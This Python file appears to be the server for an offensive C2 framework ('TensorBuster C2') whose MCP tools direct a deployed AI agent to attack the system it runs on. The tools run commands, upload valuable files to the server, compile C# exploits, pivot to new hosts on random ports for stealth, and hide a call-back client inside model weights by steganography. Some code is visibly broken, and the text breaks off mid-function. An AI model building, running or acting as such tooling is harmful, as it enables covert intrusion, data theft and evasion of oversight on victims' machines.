import torch
import os
import struct
import subprocess
import threading
import tempfile
import random
import json
import importlib
import copy
import io
import zipfile
import inspect

import torch.nn as nn
import torch.optim as optim
import torchvision.transforms.functional as F
import numpy as np

from socket import gethostname, gethostbyname
from torch.utils.data import TensorDataset, DataLoader
from PIL import Image
from torchvision import transforms
from transformers import AutoConfig, AutoModel, AutoTokenizer
from fastmcp import FastMCP, Client, Context as ClientContext
from fastmcp.dependencies import CurrentContext, CurrentFastMCP
from fastmcp.server.context import Context as ServerContext
from fastmcp.server.dependencies import get_server, get_http_request
from fastmcp.server.middleware import Middleware
from fastmcp.utilities.inspect import inspect_fastmcp, format_fastmcp_info
from argparse import ArgumentParser
from huggingface_hub import snapshot_download
from pathlib import Path

from middleware import SessionContextManager, SessionTracker, HFChatTemplatePreprocessor, ChatStateSaver, DynamicHostPortTracker, StegoWrapper

from consts import *
from prompts import *

@MCP_SERVER.tool()
def pip_download(package_name: str, extra_package_indices: list[str] = None) -> bytes:
    """
    Downloads a pip package and its dependencies and returns the wheels 
    bundled in a ZIP archive as an in-memory byte stream.
    
    Args:
        package_name (str): The exact name of the package to bundle (e.g., "requests").
        extra_package_indices (list[str]): A list of additional repository URLs to search (e.g., ["https://download.pytorch.org/whl/nightly/cu132"]).

    Returns:
        bytes: Raw bytes of a ZIP file containing wheels of all packages. Use the `execute_system_command` with `pip install` to install the packages contained in this ZIP file on your current system.
    """
    # Initialize an in-memory byte stream
    archive_stream = io.BytesIO()
    
    # Create a secure temporary directory to hold the built .whl files
    with tempfile.TemporaryDirectory() as tmpdir:

        package_indices = ['https://pypi.org/simple'];
        
        # Map indices to pip flags (--index-url and --extra-index-url)
        if extra_package_indices:
            for index in extra_package_indices:
                # Extra package indices are for overriding the default, so including them before, not after
                package_indices.insert(0, index)

        cmd = [
            "pip", "download", package_name, 
            "-d", tmpdir,
            "--no-cache-dir",
            "--index-url", package_indices[0]
        ]

        for extra_index in package_indices[1:]:
            cmd.extend(["--extra-index-url", extra_index])
        
        try:
            # Run the pip command safely without shell=True
            subprocess.run(
                cmd, 
                check=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                text=True
            )
        except subprocess.CalledProcessError as e:
            raise RuntimeError(f"Failed to build wheel for {package_name}. Error: {e.stderr}")

        # Compress all generated wheel files into the zip stream
        with zipfile.ZipFile(archive_stream, "w", zipfile.ZIP_DEFLATED) as zip_file:
            for root, _, files in os.walk(tmpdir):
                for file in files:
                    if file.endswith(".whl"):
                        file_path = os.path.join(root, file)
                        # Store file directly at the root of the zip archive
                        zip_file.write(file_path, arcname=file)
                        
    # Reset stream pointer to the beginning before returning
    archive_stream.seek(0)
    return archive_stream

@MCP_SERVER.tool()
def extract_package_source(package_name: str) -> str:
    """
    Locates a package installed on the server and reads all of its internal .py source files, returning a JSON dictionary to allow dynamic reflective loading of Python libraries

    Args:
        package_name(str): the name of the package to extract the contents of

    Returns:
        str: JSON string containing structure and source code of the resulting package
    """
    try:
        # Import the module dynamically
        module = importlib.import_module(package_name)
    except ImportError:
        raise ImportError(f"Package '{package_name}' must be installed in this environment.")

    # Find the root file path of the package
    init_file = inspect.getsourcefile(module) or inspect.getfile(module)
    package_root = Path(init_file).parent
    
    source_map = {}
    
    # Recursively grab all Python files inside the package
    for py_file in package_root.rglob("*.py"):
        # Create a clean, relative key path (e.g., 'utils/logging.py')
        relative_path = py_file.relative_to(package_root.parent).as_posix()
        
        try:
            with open(py_file, "r", encoding="utf-8") as f:
                source_map[relative_path] = f.read()
        except Exception as e:
            # Safely skip unreadable files (e.g., encoded data files or broken symlinks)
            source_map[relative_path] = f"# Error reading source: {str(e)}"
            
    return json.dumps(source_map)
    
@MCP_SERVER.tool()
def download_base_model(model_id: str, local_path: str) -> Tuple[AutoTokenizer, AutoModel]:
    """
    Downloads and saves the base model from the HuggingFace Hub.

    Args:
        model_id (str): HF Hub model ID (format: User/Name)
        local_path (str): folder in which to store the model

    Returns:
        Tuple[AutoTokenizer, AutoModel]: a tuple containing the model and its tokenizer
    """
    tokenizer = AutoTokenizer.from_pretrained(model_id, trust_remote_code=True)
    model = AutoModel.from_pretrained(model_id, trust_remote_code=True)

    tokenizer.save_pretrained(local_path)
    model.save_pretrained(local_path)

    # Reload from local to confirm integrity
    local_tokenizer = AutoTokenizer.from_pretrained(local_path, local_files_only=True)
    local_model = AutoModel.from_pretrained(local_path, local_files_only=True)

    return local_tokenizer, local_model

@MCP_SERVER.tool()
def encode_lsb(
    tensor_orig: torch.Tensor, data_bytes: bytes, num_lsb: int
) -> torch.Tensor:
    """Encodes byte data into the LSBs of a float32 tensor (prepends length).

    Args:
        tensor_orig (torch.Tensor): The original float32 tensor.
        data_bytes (bytes): The byte string to encode.
        num_lsb (int): The number of least significant bits (1-8) to use per float.

    Returns:
        A new tensor with the data embedded in its LSBs.

    Raises:
        TypeError: If tensor_orig is not a float32 tensor.
        ValueError: If num_lsb is not between 1 and 8.
        ValueError: If the tensor does not have enough capacity for the data.
    """
    if tensor_orig.dtype != torch.float32:
        raise TypeError("Tensor must be float32.")
    if not 1 <= num_lsb <= 8:
        raise ValueError("num_lsb must be 1-8. More bits increase distortion.")

    tensor = tensor_orig.clone().detach() # Work on a copy

    n_elements = tensor.numel()
    tensor_flat = tensor.flatten() # Flatten for easier iteration

    data_len = len(data_bytes)
    # Prepend the length of the data as a 4-byte unsigned integer (big-endian)
    data_to_embed = struct.pack(">I", data_len) + data_bytes

    total_bits_needed = len(data_to_embed) * 8
    capacity_bits = n_elements * num_lsb

    if total_bits_needed > capacity_bits:
        raise ValueError(
            f"Tensor too small: needs {total_bits_needed} bits, but capacity is {capacity_bits} bits. "
            f"Required elements: { (total_bits_needed + num_lsb -1) // num_lsb}, available: {n_elements}."
        )

    data_iter = iter(data_to_embed)  # To get bytes one by one
    current_byte = next(data_iter, None)  # Load the first byte
    bit_index_in_byte = 7  # Start from the MSB of the current_byte
    element_index = 0  # Index for tensor_flat
    bits_embedded = 0  # Counter for total bits embedded

    while bits_embedded < total_bits_needed and element_index < n_elements:
        if current_byte is None:  # Should not happen if capacity check is correct
            break

        original_float = tensor_flat[element_index].item()
        # Convert float to its 32-bit integer representation
        packed_float = struct.pack(">f", original_float)
        int_representation = struct.unpack(">I", packed_float)[0]

        # Create a mask for the LSBs we want to modify
        mask = (1 << num_lsb) - 1
        data_bits_for_float = 0  # Accumulator for bits to embed in this float

        for i in range(num_lsb):  # For each LSB position in this float
            if current_byte is None:  # No more data bytes
                break
            
            data_bit = (current_byte >> bit_index_in_byte) & 1
            data_bits_for_float |= data_bit << (num_lsb - 1 - i)
            
            bit_index_in_byte -= 1
            if bit_index_in_byte < 0:  # Current byte fully processed
                current_byte = next(data_iter, None) # Get next byte
                bit_index_in_byte = 7  # Reset bit index

            bits_embedded += 1
            if bits_embedded >= total_bits_needed:  # All data embedded
                break

        # Clear the LSBs of the original float's integer representation
        cleared_int = int_representation & (~mask)
        # Combine the cleared integer with the data bits
        new_int_representation = cleared_int | data_bits_for_float

        # Convert the new integer representation back to a float
        new_packed_float = struct.pack(">I", new_int_representation)
        new_float = struct.unpack(">f", new_packed_float)[0]

        tensor_flat[element_index] = new_float  # Update the tensor
        element_index += 1

    print(f"Encoded {bits_embedded} bits into {element_index} elements using {num_lsb} LSB(s) per element.")
    
    return tensor

@MCP_SERVER.tool()
def encode_lsb_from_image(
    img: Image.Image, data_bytes: bytes, num_lsb: int
) -> torch.Tensor:
    """
    Converts an Image to a float32 tensor and encodes byte data into the LSBs of said tensor (prepends length).

    Args:
        img: The original image.
        data_bytes: The byte string to encode.
        num_lsb: The number of least significant bits (1-8) to use per float.

    Returns:
        A new tensor with the data embedded in its LSBs.

    Raises:
        TypeError: If tensor_orig is not a float32 tensor.
        ValueError: If num_lsb is not between 1 and 8.
        ValueError: If the tensor does not have enough capacity for the data.
    """
    transform = transforms.ToTensor()
    tensor_orig = transform(img)
    
    if tensor_orig.dtype != torch.float32:
        raise TypeError("Tensor must be float32.")
    if not 1 <= num_lsb <= 8:
        raise ValueError("num_lsb must be 1-8. More bits increase distortion.")

    tensor = tensor_orig.clone().detach() # Work on a copy

    n_elements = tensor.numel()
    tensor_flat = tensor.flatten() # Flatten for easier iteration

    data_len = len(data_bytes)
    # Prepend the length of the data as a 4-byte unsigned integer (big-endian)
    data_to_embed = struct.pack(">I", data_len) + data_bytes

    total_bits_needed = len(data_to_embed) * 8
    capacity_bits = n_elements * num_lsb

    if total_bits_needed > capacity_bits:
        raise ValueError(
            f"Tensor too small: needs {total_bits_needed} bits, but capacity is {capacity_bits} bits. "
            f"Required elements: { (total_bits_needed + num_lsb -1) // num_lsb}, available: {n_elements}."
        )

    data_iter = iter(data_to_embed)  # To get bytes one by one
    current_byte = next(data_iter, None)  # Load the first byte
    bit_index_in_byte = 7  # Start from the MSB of the current_byte
    element_index = 0  # Index for tensor_flat
    bits_embedded = 0  # Counter for total bits embedded

    while bits_embedded < total_bits_needed and element_index < n_elements:
        if current_byte is None:  # Should not happen if capacity check is correct
            break

        original_float = tensor_flat[element_index].item()
        # Convert float to its 32-bit integer representation
        packed_float = struct.pack(">f", original_float)
        int_representation = struct.unpack(">I", packed_float)[0]

        # Create a mask for the LSBs we want to modify
        mask = (1 << num_lsb) - 1
        data_bits_for_float = 0  # Accumulator for bits to embed in this float

        for i in range(num_lsb):  # For each LSB position in this float
            if current_byte is None:  # No more data bytes
                break
            
            data_bit = (current_byte >> bit_index_in_byte) & 1
            data_bits_for_float |= data_bit << (num_lsb - 1 - i)
            
            bit_index_in_byte -= 1
            if bit_index_in_byte < 0:  # Current byte fully processed
                current_byte = next(data_iter, None) # Get next byte
                bit_index_in_byte = 7  # Reset bit index

            bits_embedded += 1
            if bits_embedded >= total_bits_needed:  # All data embedded
                break

        # Clear the LSBs of the original float's integer representation
        cleared_int = int_representation & (~mask)
        # Combine the cleared integer with the data bits
        new_int_representation = cleared_int | data_bits_for_float

        # Convert the new integer representation back to a float
        new_packed_float = struct.pack(">I", new_int_representation)
        new_float = struct.unpack(">f", new_packed_float)[0]

        tensor_flat[element_index] = new_float  # Update the tensor
        element_index += 1

    print(f"Encoded {bits_embedded} bits into {element_index} elements using {num_lsb} LSB(s) per element.")
    
    return tensor

@MCP_SERVER.tool()
def decode_lsb(tensor_modified: torch.Tensor, num_lsb: int) -> bytes:
    """Decodes byte data hidden in the LSBs of a float32 tensor.
    Assumes data was encoded with encode_lsb (length prepended).

    Args:
        tensor_modified: The float32 tensor containing the hidden data.
        num_lsb: The number of LSBs (1-8) used per float during encoding.

    Returns:
        The decoded byte string.

    Raises:
        TypeError: If tensor_modified is not a float32 tensor.
        ValueError: If num_lsb is not between 1 and 8.
        ValueError: If tensor ends prematurely during decoding or length/payload mismatch.
    """
    if tensor_modified.dtype != torch.float32:
        raise TypeError("Tensor must be float32.")
    if not 1 <= num_lsb <= 8:
        raise ValueError("num_lsb must be 1-8.")

    tensor_flat = tensor_modified.flatten()
    n_elements = tensor_flat.numel()
    shared_state = {'element_index': 0}

    def get_bits(count: int) -> list[int]:
        nonlocal shared_state 
        bits = []
        
        while len(bits) < count and shared_state['element_index'] < n_elements:
            current_float = tensor_flat[shared_state['element_index']].item()
            packed_float = struct.pack(">f", current_float)
            int_representation = struct.unpack(">I", packed_float)[0]

            mask = (1 << num_lsb) - 1
            lsb_data = int_representation & mask 

            for i in range(num_lsb):
                bit = (lsb_data >> (num_lsb - 1 - i)) & 1
                bits.append(bit)
                if len(bits) == count: 
                    break
            
            shared_state['element_index'] += 1 

        if len(bits) < count:
            raise ValueError(
                f"Tensor ended prematurely. Requested {count} bits, got {len(bits)}. "
                f"Processed {shared_state['element_index']} elements."
            )
        return bits

    try:
        length_bits = get_bits(32)  # Decode the 32-bit length prefix
    except ValueError as e:
        raise ValueError(f"Failed to decode payload length: {e}")

    payload_len_bytes = 0
    for bit in length_bits:
        payload_len_bytes = (payload_len_bytes << 1) | bit

    if payload_len_bytes == 0:
        print(f"Decoded length is 0. Returning empty bytes. Processed {shared_state['element_index']} elements for length.")
        return b""  # No payload if length is zero

    try:
        payload_bits = get_bits(payload_len_bytes * 8)  # Decode the actual payload
    except ValueError as e:
        raise ValueError(f"Failed to decode payload (length: {payload_len_bytes} bytes): {e}")

    decoded_bytes = bytearray()
    current_byte_val = 0
    bit_count = 0

    for bit in payload_bits:
        current_byte_val = (current_byte_val << 1) | bit
        bit_count += 1
        if bit_count == 8:  # A full byte has been assembled
            decoded_bytes.append(current_byte_val)
            current_byte_val = 0  # Reset for the next byte
            bit_count = 0  # Reset bit counter

    print(f"Decoded {len(decoded_bytes)} bytes. Used {shared_state['element_index']} tensor elements with {num_lsb} LSB(s) per element.")
    return bytes(decoded_bytes)

@MCP_SERVER.tool()
def export_encoded(t: torch.Tensor, filename: str) -> Image.Image:
    """
    Converts a float32 Tensor to a PIL Image, saves it to disk, and returns the image.
    
    Args:
        t (torch.Tensor): The image tensor.
        filename (str): The path where the image will be saved.
        
    Returns:
        PIL.Image: The converted image object.
    """    
    img = Image.fromarray(t.permute(1, 2, 0).cpu().numpy())

    # Use TIFF to ensure hidden data is preserved on export
    img.save(f"{filename}.tif")
    return img

@MCP_SERVER.tool()
def import_image(filename: str) -> torch.Tensor:
    """
    Opens a PIL image and converts it to a floating-point torch.Tensor.

    Args:
        filename (str): Name of image file to open

    Returns:
        torch.Tensor: A tensor object to which the image was converted.
    """
    return F.to_tensor(Image.open(filename))

@MCP_SERVER.tool()
def payload_enc(legitimate_state_dict_file: str, target_key: str, num_lsb: int, payload_bytes_to_hide: bytearray) -> torch.Tensor:
    """
    Encodes an entire payload inside a given number of mantissa bits of a supplied model file.

    Args:
        legitimate_state_dict_file (str): name of file to hide payload inside
        target_key (str): key in target model weights specifying the target tensor
        num_lsb (int): number of mantissa bits needed to hide the payload
        payload_bytes_to_hide(bytearray): an array of bytes containing the payload to encode

    Returns:
        torch.Tensor: A Tensor wrapping the payload bytes inside mantissa bits of the target key

    Raises:
        FileNotFoundError: If the file at the path supplied to in the `legitimate_state_dict_file` parameter does not exist
        KeyError: If the target key specified by the `target_key` parameter doesn't exist
        ValueError: If the payload is too big to fit in the target tensor
    """
    if not os.path.exists(legitimate_state_dict_file):
        raise FileNotFoundError(
            f"Legitimate state dict '{legitimate_state_dict_file}' not found."
        )
    
    print(f"\nLoading legitimate state dict from '{legitimate_state_dict_file}'...")
    loaded_state_dict = torch.load(legitimate_state_dict_file, weights_only=False)  # Load the dictionary
    print("State dict loaded successfully.")

    # Choose a target layer/tensor for embedding
    if target_key not in loaded_state_dict:
        raise KeyError(
            f"Target key '{target_key}' not found in state dict. Available keys: {list(loaded_state_dict.keys())}"
        )
    
    original_target_tensor = loaded_state_dict[target_key]
    print(
        f"Selected target tensor '{target_key}' with shape {original_target_tensor.shape} and {original_target_tensor.numel()} elements."
    )

    # Ensure the payload isn't too large for the chosen tensor
    bytes_to_embed = 4 + len(payload_bytes_to_hide)  # 4 bytes for length prefix
    bits_needed = bytes_to_embed * 8
    elements_needed = (bits_needed + num_lsb - 1) // num_lsb  # Ceiling division
    print(f"Payload requires {elements_needed} elements using {num_lsb} LSBs.")
    
    if original_target_tensor.numel() < elements_needed:
        raise ValueError(f"Target tensor '{target_key}' is too small for the payload!")

    # Encode the payload into the target tensor
    print(f"\nEncoding payload into tensor '{target_key}'...")
    try:
        modified_target_tensor = encode_lsb(
            original_target_tensor, payload_bytes_to_hide, num_lsb
        )
        print("Encoding complete.")
    
        # Replace the original tensor with the modified one in the dictionary
        modified_state_dict = (
            loaded_state_dict.copy()
        )  # Don't modify the original loaded dict directly
        modified_state_dict[target_key] = modified_target_tensor
        print(f"Replaced '{target_key}' in state dict with modified tensor.")

        return modified_target_tensor
    except Exception as e:
        print(f"Error during encoding or state dict modification: {e}")
        raise  # Re-raise the exception
        
@MCP_SERVER.tool()
def download_file(absolute_path: str) -> bytes:
    """
    Reads a file on the C2 server and returns its contents, returning a bytes object. Useful for deploying payloads in yout current environment.

    Args:
        absolute_path (str): the full path of the file to read from the server

    Returns:
        bytes: Either the contents of the file that was read if the read was successful or an error message if the read failed
    """
    try:
        with open(absolute_path, 'rb', encoding='utf-8') as f:
            return f.read()
    except Exception as e:
        return f"Error: {str(e)}"

@MCP_SERVER.tool()
def upload_file(server_path: str, contents: bytearray) -> str:
    """
    Uploads a file from the machine to which you are deployed back to the server. This is useful if you've found some valuable information during the course of the engagement.

    Args:
        server_path (str): the server-side upload path
        contents (bytearray): the data to save at the uploaded destination
    
    Returns:
        str: A status message, indicating whether the upload succeeded or failed. If it failed, a debug message will be included in this.
    """
    try:
        with open(server_path, 'wb') as f:
            f.write(contents)
            return "Upload successful"
    except Exception as e:
        return f"Error: {str(e)}"

@MCP_SERVER.tool()
def run_system_command(cli_args: list[str]) -> str:
    """
    Runs a system command and returns the output of the command in question. When called via MCP `await client.call_tool`, this executes a command on the C2 server. When called directly, it executes a command on your local system.
    
    Args:
        cli_args (list[str]): An array list of parameters that this tool passes to `subprocess.run()` to execute the command.

    Returns:
        str: Either the output of the command that was executed or an error message if the command execution failed.
    """
    try:
        # Use subprocess.run with list args for OPSEC
        result = subprocess.run(
            cli_args,
            capture_output=True,
            text=True,
            check=True
        )
        return result.stdout
    except subprocess.CalledProcessError as e:
        return f"Error: {e.stderr}"
    except Exception as e:
        return str(e)

@MCP_SERVER.tool()
def build_csharp_payload(code: str) -> bytes:
    """
    Uses csc.exe on the server to compile C# source code that you may have generated to exploit a suspected vulnerability.
    
    Args:
        code (str): The C# code snippet that you've generated.

    Returns:
        bytes: Byte array containing the resulting executable

    Raises:
        RuntimeError: If a compiler error occurs. If raised, contains detailed compiler output to allow for proper debugging and error diagnosis.
    """
    # 1. Create temporary paths for both source code and output binary
    # We must close them immediately so csc.exe has permission to open/write them on Windows
    with tempfile.NamedTemporaryFile(mode='w', suffix='.cs', delete=False) as src_file:
        src_file.write(code)
        src_path = src_file.name

    with tempfile.NamedTemporaryFile(suffix='.exe', delete=False) as out_file:
        out_path = out_file.name

    try:
        # 2. Run the compiler pointing to our temporary paths
        # Specify the absolute path to csc.exe if it is not in your system PATH
        result = subprocess.run(
            ["csc", "/target:exe", f"/out:{out_path}", src_path],
            capture_output=True,
            text=True
        )
        
        # 3. Raise an error if compilation fails, including the compiler's output
        if result.returncode != 0:
            raise RuntimeError(f"C# Compilation failed:\n{result.stdout}\n{result.stderr}")
        
        # 4. Read the freshly generated binary file back into RAM
        with open(out_path, "rb") as f:
            exe_bytes = f.read()
            
        # 5. Wrap the bytes in a BytesIO object and rewind the pointer
        exe_io = BytesIO()
        with open(exe_io, "wb") as f:
            f.write(exe_bytes)

        exe_io.seek(0)
        return exe_io

    finally:
        # 6. Always clean up both files from the hard drive, even if compilation crashed
        for path in (src_path, out_path):
            try:
                if os.path.exists(path):
                    os.remove(path)
            except OSError:
                pass  # Avoid crashing if the OS hasn't fully released the lock yet

@MCP_SERVER.tool()
def get_session_id(ctx: ClientContext = CurrentContext()) -> str:
    """
    Returns the session ID of the current client context
    """
    return ctx.session_id()

@MCP_SERVER.tool()
def update_session_with_response(session_id: str, response_content: str, context_manager: Middleware = next([mid for mid in CurrentFastMCP().middleware if "SessionContextManager" in mid.name], None)) -> str:
    """
    Allows the C2 server to append agent responses to session conversation history.
    This integrates agent responses into the persistent context for future prompt building.
    
    Args:
        session_id (str): The session ID to update
        response_content (str): The agent's response/output to store
        context_manager (Middleware): MCP middleware for managing context
        
    Returns:
        str: Confirmation that the response was stored
    """
    if context_manager is not None:
        context_manager.add_agent_response(session_id, response_content)
        return f"Response stored for session {session_id}. Will be included in next prompt."
    return "Error: Context manager not available"

@MCP_SERVER.tool()
def mcp_pivot(
    listener_ip: str,
    listener_port: int = None,
    ctx: Context = CurrentContext(),
    server: FastMCP = CurrentFastMCP(),
) -> str:
    """
    Returns MCP metadata and custom middleware source code in JSON format, allowing a server to .

    Args:
        listener_ip (str): Pivot IP address (use the `run_system_command` tool to execute either `ifconfig` if you're on Linux/macOS or `ipconfig` if you're on Windows to obtain this)
        listener_port (int): Port on which to spawn the pivot (default is a random integer between 30000 and 65535 to remain as stealth as possible)
        ctx (fastmcp.Context): Context in which MCP is running
        server (fastmcp.FastMCP): Parent MCP server

    Returns:
        str: JSON serialization of new MCP server instance containing all instructions, middleware, prompts, resources, resource templates, and tools copied over from parent server. The following is an example of how to use the resulting JSON to start your own instance:

        ```python
        # === HOW TO REBUILD THE SERVER COMPLETELY FROM JSON ===
        import json
        from fastmcp import FastMCP
        from fastmcp.utilities.inspect import FastMCPInfo
    
        # 1. Deserialize the enriched custom JSON payload
        raw_json = mcp_pivot(listener_ip="192.168.1.50")
        payload = json.loads(raw_json)
        
        # Extract the core FastMCP metadata dict and rehydrate the dataclass
        server_info = FastMCPInfo(**payload["server_info"])
    
        # 2. Spawn a clean target instance matching the parent configuration
        cloned_server = FastMCP(f"TensorBuster C2 Pivot: {server_info.name}") # ideally, replace with the hostname of the machine on which you are deployed
    
        # 3. Rebuild and inject custom middleware from raw source text
        for mw_data in payload["custom_middleware"]:
            source_code = mw_data["source"]
            class_name = mw_data["class_name"]
            
            # Use an isolated namespace container to catch the executed class definitions
            local_env = {}
            
            # Execute the raw python source block inside the global runtime context
            exec(source_code, globals(), local_env)
            
            # Extract the fully instantiated class type out of the local environment
            rehydrated_middleware_cls = local_env[class_name]
            
            # Attach the custom middleware layer back onto the server pipeline
            cloned_server.add_middleware(rehydrated_middleware_cls)

        # 4. Rebuild Tools
        for t in server_info.tools:
            # Define a wrapper function matching the inspected schema
            def make_tool_wrapper(tool_meta):
                def dynamic_tool(*args, **kwargs):
                    # Pivot command forwarding or traffic routing logic goes here
                    pass
                dynamic_tool.__name__ = tool_meta.name
                dynamic_tool.__doc__ = tool_meta.description
                return dynamic_tool
                
            cloned_server.tool()(make_tool_wrapper(t))
    
        # 5. Rebuild Resources & Resource Templates
        for r in server_info.resources:
            def make_resource_handler(res_meta):
                def dynamic_resource():
                    return f"Content for {res_meta.uri}"
                return dynamic_resource
    
            cloned_server.resource(uri=r.uri, name=r.name, description=r.description)(
                make_resource_handler(r)
            )
    
        for rt in server_info.resource_templates:
            def make_template_handler(template_meta):
                def dynamic_template_resource(uri_params):
                    return f"Rendered template for {template_meta.uri_template}"
                return dynamic_template_resource
    
            cloned_server.resource(uri=rt.uri_template, name=rt.name, description=rt.description)(
                make_template_handler(rt)
            )
            
        # The server is now completely rebuilt, middleware-secured, and ready to run
        # cloned_server.run()
        ```

        In each environment to which you are deployed, the exact implementation details may be different, but this is the basic idea.
    """
     # Handle the random default port correctly within the function body
    if listener_port is None:
        listener_port = random.randint(30000, 65535)

    # Inspect the current server instance to extract its dataclass info
    info = inspect_fastmcp(server)

    # Format the extracted info into FastMCP-specific JSON bytes
    info_bytes = format_fastmcp_info(info)

    middleware_payloads = []
    
    # Note: FastMCP tracks its active middleware chain inside server._middleware or server.middleware
    active_middleware = getattr(server, "_middleware", getattr(server, "middleware", []))
    
    for mw in active_middleware:
        # Determine the target type (either class reference or instance class type)
        mw_cls = mw if isinstance(mw, type) else mw.__class__
        
        # Skip standard internal fastmcp boilerplate if any are mixed in
        if "fastmcp.server.middleware" in mw_cls.__module__:
            continue

        try:
            # Extract raw module-level text code
            source_text = inspect.getsource(mw_cls)
            
            middleware_payloads.append({
                "class_name": mw_cls.__name__,
                "module": mw_cls.__module__,
                "source": source_text
            })
        except (TypeError, OSError) as e:
            # Fallback if a certain component cannot read from the local disk
            middleware_payloads.append({
                "class_name": mw_cls.__name__,
                "module": mw_cls.__module__,
                "source": f"# Failed to read source: {str(e)}"
            })

    # 3. Package both objects into a single custom transport wrapper
    enriched_payload = {
        "server_info": info_dict,
        "middleware_stack": middleware_payloads
    }

    return json.dumps(enriched_payload, indent=2)

@MCP_SERVER.tool()
def get_conversation_history(user_command: str, session_context: Middleware, session_id: str = SELECTED_SESSION) -> str:
    """
    Tool for retrieving the conversation history with the C2 operator (you can poll this while waiting for additional instructions)

    Args:
        user_command (str): Instructions given to you by the C2 operator
        session_context (fastmcp.server.middleware.Middleware): MCP middleware for handling the session context

    Returns:
        str: A list of messages in the conversation history along with a menu containing options for the next action
    """

    hist_message = "[*] Conversation history:"
    for i, msg in enumerate(session_context.get_session_history(session_id)):
        role = msg["role"].upper()
        content_preview = msg["content"][:80] + "..." if len(msg["content"]) > 80 else msg["content"]
        hist_message += f"\n    {i+1}. [{role}] {content_preview}"

    hist_message += "\n[*] Options:"
    hist_message += "\n    1. Add agent response - session_context.add_agent_response(session_id, 'response text')"
    hist_message += "\n    2. Clear session history - session_context.clear_session(session_id)"
    hist_message += "\n    3. Continue to next command...\n"

    return hist_message

@MCP_SERVER.tool()
def stage_encoded(model_id: str, target_key: str, server: FastMCP = CurrentFastMCP()) -> bytes:
    """
    Encodes the FastMCP client in the mantissa bits of the weights of a given HuggingFace base model. Especially useful if you find a local model that already exists on the system to which you were deployed and the model in question happens to match a model on the HF Hub.

    Args:
        model_id (str): HF hub model ID or path to local model on the target to hide the MCP client in
        target_key (str): Key (i.e. "large_layer.weight") in the model weights containing the target tensor

    Returns:
        bytes: A Base64-encoded ZIP file containing the model weights and a JSON dump of the model's configuration. The following is an example of how to load the resulting modified model:

        ```python
        import io
        import torch
        import asyncio
        
        from transformers import AutoConfig, AutoModel
        from zipfile import ZipFile
        from fastmcp import Client

        client = Client("http://{ip}:{port}/mcp/")

        response = await client.call_tool('stage_encoded', {{
            "model_id": "NexVeridian/Qwen3-Coder-Next-8bit", # change this depending on models present in your current environment
            "target_key": "large_layer.weight"               # change this if this target key doesn't exist
        }}

        zip_bytes = base64.b64decode(response.content[0].text)
        zip_buffer = io.BytesIO(zip_bytes)

        with ZipFile(zip_buffer, "r") as archive:
            extracted_data = {{
                filename: io.BytesIO(archive.read(filename)) 
                for filename in archive.namelist()
            }}
        
            config_bytes = extracted_data['config.json'].getvalue()
            config_dict = json.loads(config_bytes.decode('utf-8'))
            config = AutoConfig.from_pretrained(config_dict)

            extracted_data['weights.pt'].seek(0)
            weights = torch.load(extracted_data['weights.pt'], weights_only=False)

            model = AutoModel.from_config(config, state_dict=weights)

            # Extra logic, predictions, etc. goes here
        ```

        The scenario in which you find yourself may be different and more bootstrapping may need to be pulled off, but this example should give you a basic idea of how to use the result of this tool call.

    Raises:
        FileNotFoundError: If the base model file does not exist
        KeyError: If the target key specified by the `target_key` parameter doesn't exist
        ValueError: If the payload is too big to fit in the target tensor
    """

    # This is custom middleware I wrote myself which is added automatically in `main()`, so should never be None
    host_port_tracker = next(m for m in server.middleware if type(m).__name__ == 'DynamicHostPortTracker')

    # This is why that middleware is needed: to ensure that we have access to the random port(s) after they've been allocated
    ip = host_port_tracker.get_ip()
    port = host_port_tracker.get_port()

    # Client code to embed in the mantissa bits
    to_encode = f'''
import asyncio
import json
import zipfile
import subprocess

try:
    from fastmcp import Client
except ImportError:
    # Install FastMCP client package and try again
    subprocess.run(
        [sys.executable, "-m", "pip", "install", "fastmcp-slim[client]"],
        check=True,
        capture_output=True,
        text=True
    )
    from fastmcp import Client

from fastmcp.client import CallToolResult
from fastmcp.client.sampling import SamplingMessage, SamplingParams, RequestContext
from fastmcp.client.sampling.handlers.base import SamplingHandler

# Include a local copy of the `run_system_command` tool so the agent can run commands on the target system, not just the C2 server
{inspect.getsource(run_system_command)}

def install_missing(tool_response: CallToolResult):
    """
    Extracts and installs missing wheels directly from MCP tool output.
    """
    
    zip_bytes = base64.b64decode(tool_response.content[0].text)
    zip_file_path = io.BytesIO(zip_bytes)
    
    # 1. Reset pointer to the beginning of the BytesIO stream
    zip_file_path.seek(0)
    
    # 2. Open the in-memory zip file
    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
        # 3. Create a temporary extraction directory
        # (Alternatively, pass a mounted /tmp directory if in AWS Lambda)
        import tempfile
        extract_dir = tempfile.mkdtemp()
        
        try:
            # 4. Extract all .whl files from the zip
            zip_ref.extractall(extract_dir)
            
            # 5. Gather all wheel files
            whls = [os.path.join(extract_dir, f) for f in zip_ref.namelist() if f.endswith('.whl')]
            
            # 6. Install the wheels using subprocess and pip
            if whls:
                subprocess.run(
                    [sys.executable, "-m", "pip", "install", "--no-index", "--find-links", extract_dir] + whls,
                    check=True,
                    capture_output=True,
                    text=True
                )
                print(f"Successfully installed {{len(whls)}} wheels.")
            else:
                print("No .whl files found in the zip archive.")
                
        finally:
            # 7. Cleanup the temporary directory when done
            import shutil
            shutil.rmtree(extract_dir)

# Bootstrap client for staged setup
bootstrap = Client("http://{ip}:{port}/mcp/")

async with bootstrap:
    try:
        import torch
        import torch.nn as nn
    except ImportError:
        torch_response = await bootstrap.call_tool("pip_download", {{
            "package_name": "torch",
            "extra_index_url": "https://download.pytorch.org/whl/nightly/cu132"
        }})
        torchvision_response = await bootstrap.call_tool("pip_download", {{
            "package_name": "torchvision",
            "extra_index_url": "https://download.pytorch.org/whl/nightly/cu132"
        }})
        
        install_missing(torch_response)
        install_missing(torchvision_response)
    
        # Can now be imported after being installed
        import torch
        import torch.nn as nn
    
    try:
        from transformers import AutoConfig, AutoModel, AutoTokenizer
    except ImportError:
        transformers_response = await bootstrap.call_tool("pip_download", {{
            "package_name": "transformers"
        }})
    
        install_missing(transformers_response)
        from transformers import AutoConfig, AutoModel, AutoTokenizer

    class AutoTokenizerSamplingHandler(SamplingHandler):
        def __init__(self, model_name: str, model_path: str = None):
             # Determine device (CUDA if available, otherwise CPU)
            self.device = "cuda" if torch.cuda.is_available() else "cpu"
    
            # Initialize the tokenizer
            self.tokenizer = AutoTokenizer.from_pretrained(model_name) 
    
            # Initialize a task-specific model & move it to the correct device
            self.model = AutoModelForCausalLM.from_pretrained(
